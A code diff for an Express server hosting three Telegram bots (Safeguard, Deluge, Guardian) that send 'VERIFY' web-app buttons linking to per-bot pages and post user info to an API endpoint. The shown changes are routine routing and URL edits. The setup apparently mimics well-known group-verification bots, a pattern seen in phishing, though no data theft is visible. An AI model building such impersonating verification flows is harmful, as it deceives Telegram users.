@@ -57,14 +57,17 @@ const app = express();
 app.use(express.json());
 app.use(express.static("public"));
 
+// Serve HTML from subfolders with bot username injected
 app.get("/safeguard/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "safeguard", "index.html"));
 });
+
 app.get("/deluge/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "deluge", "index.html"));
 });
+
 app.get("/guardian/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "guardian", "index.html"));
 });
 
 app.post("/api/users/telegram/info", async (req, res) => {
@@ -152,7 +155,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "VERIFY",
                 web_app: {
-                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
+                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard&botUsername=${safeguardUsername}`
                 }
               }]]
             }
@@ -166,7 +169,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Tap To Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                  url: `${process.env.DOMAIN}/deluge/?type=deluge&botUsername=${delugeUsername}`
                 }
               }]]
             }
@@ -180,7 +183,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                  url: `${process.env.DOMAIN}/guardian/?type=guardian&botUsername=${guardianUsername}`
                 }
               }]]
             }
@@ -203,6 +206,5 @@ handleStart(safeguardBot);
 handleStart(delugeBot);
 handleStart(guardianBot);
 
-// Use Render's assigned port
 const port = process.env.PORT || 80;
 app.listen(port, () => console.log(`loaded everyone & running on port ${port}`));
